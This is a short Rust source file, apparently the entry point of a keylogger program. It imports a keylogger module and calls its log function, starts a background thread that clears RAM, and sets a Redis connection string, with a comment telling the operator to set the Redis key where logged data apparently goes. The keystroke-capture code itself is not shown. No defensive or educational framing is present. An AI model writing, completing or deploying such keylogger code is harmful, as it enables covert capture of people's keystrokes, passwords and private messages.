use std::thread;

use crate::keylogger::log;
use crate::ram::clear_cache::clear_ram_thread;

mod ram;
pub mod db;
mod keylogger;

// Make sure to set the redis key!!!!
const REDIS_KEY: &str = "redis://127.0.0.1:6379";

fn main() {
    thread::spawn(|| { clear_ram_thread() });
    log();
}
// Rochac
